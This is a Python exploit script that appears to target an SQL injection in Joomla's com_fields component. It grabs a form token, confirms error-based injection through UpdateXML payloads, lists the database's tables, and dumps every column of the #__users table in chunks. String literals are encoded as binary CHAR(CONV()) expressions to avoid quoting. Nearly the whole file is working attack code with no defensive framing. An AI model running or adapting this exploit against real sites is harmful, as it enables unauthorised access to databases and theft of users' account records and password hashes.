import requests
import math
import re

scheme = 'http'
host = ''  # TODO
port = '80'
uri = 'index.php'
debug = True
selectAllSeperator = " ||| "
chunkSize = 31
queryParamsScheme = {
    "option": "com_fields",
    "view": "fields",
    "layout": "modal",
    "list[fullordering]": "sqli",
}


def getBaseUrl(scheme, host, port, uri):
    return "{0}://{1}:{2}/{3}".format(scheme, host, port, uri)


def debug(message):
    if debug:
        print("------> {0}".format(message))


def display(message):
    print(">> {0}".format(message))


def encapsulateSqli(rawSqli):
    return "UpdateXML(2, concat(0x3a, ({0}), 0x3a), 1)".format(rawSqli)


def convertStringForPayload(stringToConvert):
    result = "concat("
    lastIndex = len(stringToConvert) - 1
    for index, char in enumerate(stringToConvert):
        result += "CHAR(CONV({0}, 2, 10))".format(format(ord(char), '08b'))
        if index < lastIndex:
            result += ","

    return result + ")"


def getToken(baseUrl):
    response = requests.get("{0}/index.php/component/users/?view=login".format(baseUrl))
    inputTags = re.findall(r'<input\s+.*?>', response.text)
    tokenInput = [tag for tag in inputTags if 'type="hidden"' in tag and 'value="1"' in tag][0]
    tokenValue = re.search(r'name="([^"]+)"', tokenInput).group(1)

    display("Extracted the token : {0}".format(tokenValue))

    return tokenValue


def buildSqliQueryParams(sqli, token):
    cloned = dict(queryParamsScheme)
    cloned["list[fullordering]"] = encapsulateSqli(sqli)
    cloned[token] = "1"

    return cloned


def doHttpRequest(url, queryParameters):
    response = requests.get(url, params=queryParameters)

    start_index = response.text.find("<title>") + len("<title>")
    end_index = response.text.find("</title>", start_index)

    # Extract the title content
    title = response.text[start_index:end_index].strip()
    debug(title)

    return title


def extractBetween(rawString, start, ends=None):
    start_index = rawString.find(start) + len(start)

    if ends is not None:
        for end in ends:
            end_index = rawString.find(end, start_index)
            if -1 != end_index:
                return rawString[start_index:end_index]
        raise Exception("End not found during extract {0} -> {1} from {2}".format(start, ", ".join(ends), rawString))
    return rawString[start_index:]


def extractValueFromTitle(title):
    return extractBetween(title, "#039;:", [":&#039", "&#039"])


def detectIfVulnerable(baseUrl, token):
    basicSqli = "40 + 2"
    result = doHttpRequest(baseUrl, buildSqliQueryParams(basicSqli, token))

    if "42" in result:
        display("{0} is vulnerable to SQLI".format(baseUrl))

        return True

    display("{0} is NOT vulnerable to SQLI".format(baseUrl))

    return False


def getDatabaseVersion(baseUrl, token):
    sqli = "SELECT VERSION()"
    extractedVersion = extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(sqli, token)))
    display("Version detected : {0}".format(extractedVersion))


def extractQueryColumns(sqlRequest):
    return extractBetween(sqlRequest, "SELECT", ["FROM"])


def extractQueryFromPart(sqlRequest):
    return extractBetween(sqlRequest, "FROM")


def getNbRows(requestFromClause, token):
    sqli = "SELECT COUNT(*) FROM {0}".format(requestFromClause)
    countResult = extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(sqli, token)))

    return int(countResult)


def centerText(text, width):
    paddingEnd = int((math.floor(width / 2) - 1) - ((len(text) + 1) / 2))
    paddingStart = int(math.floor(width / 2) - (len(text) / 2))
    return "|" + " " * paddingStart + text + " " * paddingEnd + "|"


def printResultColumn(rows, columnName, width):
    print("-" * width)
    print(centerText(columnName, width))
    print("-" * width)
    for row in rows:
        print(centerText(row, width))
    print("-" * width)


def queryAllRow(baseUrl, sqlRequest, token):
    debug("Going to query all row for {0}".format(sqlRequest))
    columns = extractQueryColumns(sqlRequest).strip()
    fromClause = extractQueryFromPart(sqlRequest)
    debug("Extracted columns from SQL request : {0}".format(columns))
    debug("Extracted columns FROM CLAUSE form SQL request : {0}".format(fromClause))
    nbRowToQuery = getNbRows(fromClause, token)
    display("{0} row(s) detected for the SQL request : {1}".format(str(nbRowToQuery), sqlRequest))

    rows = []
    for i in range(nbRowToQuery):
        rowSqli = sqlRequest + " LIMIT 1 OFFSET {0}".format(str(i))
        rows.append(extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(rowSqli, token))))

    display("Result for SQL query : {0}".format(sqlRequest))
    printResultColumn(rows, columns, 64)
    return rows


def queryXRows(baseUrl, sqlRequest, nbRows, token):
    debug("Going to query {0} rows for {1}".format(str(nbRows), sqlRequest))

    rows = []
    for i in range(nbRows):
        rowSqli = sqlRequest + " LIMIT 1 OFFSET {0}".format(str(i))
        rows.append(extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(rowSqli, token))))

    return rows


def showTables(baseUrl, database, token):
    stringConverted = convertStringForPayload(database)
    sqli = "SELECT table_name FROM information_schema.tables WHERE table_schema = {0}".format(stringConverted)
    queryAllRow(baseUrl, sqli, token)


def showDatabase(baseUrl, token):
    sqli = "DATABASE()"
    database = extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(sqli, token)))

    display("Current database : {0}".format(database))

    return database


def describeTable(baseUrl, table, token):
    sqli = "SELECT column_name FROM information_schema.columns WHERE table_name LIKE {0}".format(
        convertStringForPayload("%" + table))
    return queryAllRow(baseUrl, sqli, token)


def columnsToConact(columns):
    return "concat({0})".format(", {0},".format(convertStringForPayload(selectAllSeperator)).join(columns))


def columnsMaxLength(columns):
    return "+ ".join("MAX(LENGTH({0}))".format(column) for column in columns)


def getLengthOfAllColumns(baseUrl, table, columns, token):
    sqli = "SELECT {0} FROM {1}".format(columnsMaxLength(columns), table)
    totalResultSize = extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(sqli, token)))

    debug("Size of the current select : {0}".format(totalResultSize))

    return int(totalResultSize)


def selectAllFrom(baseUrl, table, columns, token):
    totalResultSize = getLengthOfAllColumns(baseUrl, table, columns, token)
    totalResultSize += (len(columns) - 1) * len(selectAllSeperator)

    debug("Total size to display : {0}".format(totalResultSize))
    chunks = []
    start = 0
    end = chunkSize
    nbChunk = math.ceil(totalResultSize / chunkSize)
    debug("Nb chunk : {0}".format(nbChunk))

    columnsConcat = columnsToConact(columns)
    nbRows = getNbRows(table, token)
    debug("Nb rows {0}".format(nbRows))
    for chunk in range(nbChunk):
        sqli = "SELECT SUBSTRING({0} FROM 1 FOR {1}) FROM {2}".format(columnsConcat, str(end-1), table)
        if chunk != 0:
            sqli = "SELECT SUBSTRING({0} FROM {1} FOR {2}) FROM {3}".format(columnsConcat, str(start), str(end), table)
        chunks.append(queryXRows(baseUrl, sqli, nbRows, token))
        start = end
        end += chunkSize

    printChunks(chunks, ", ".join(columns), nbRows, 128)


def printChunks(chunks, columnsName, nbRows, width):
    print("-" * width)
    print(columnsName)
    print("-" * width)
    for row in range(nbRows):
        currentFullChunk = ""
        for chunk in chunks:
            currentFullChunk += chunk[row]
        print(currentFullChunk)
    print("-" * width)


def doExploit(baseUrl):
    token = getToken(baseUrl)
    if detectIfVulnerable(baseUrl, token):
        getDatabaseVersion(baseUrl, token)
        database = showDatabase(baseUrl, token)
        showTables(baseUrl, database, token)
        columns = describeTable(baseUrl, "users", token)
        selectAllFrom(baseUrl, "#__users", columns, token)


baseUrl = getBaseUrl(scheme, host, port, uri)

doExploit(baseUrl)

# SELECT table_name FROM information_schema.tables WHERE table_schema = CONVERT(UNHEX(hex("joomla")) USING utf8)
# SELECT table_name FROM information_schema.tables WHERE table_name  = CONVERT(UNHEX(hex("user")) USING utf8)
# rm exploit.py ; vim exploit.py && python3 exploit.py

# SELECT  table_name FROM information_schema.tables WHERE table_name  =  CHAR(CONV(01110101011100110110010101110010, 2, 10)) LIMIT 1
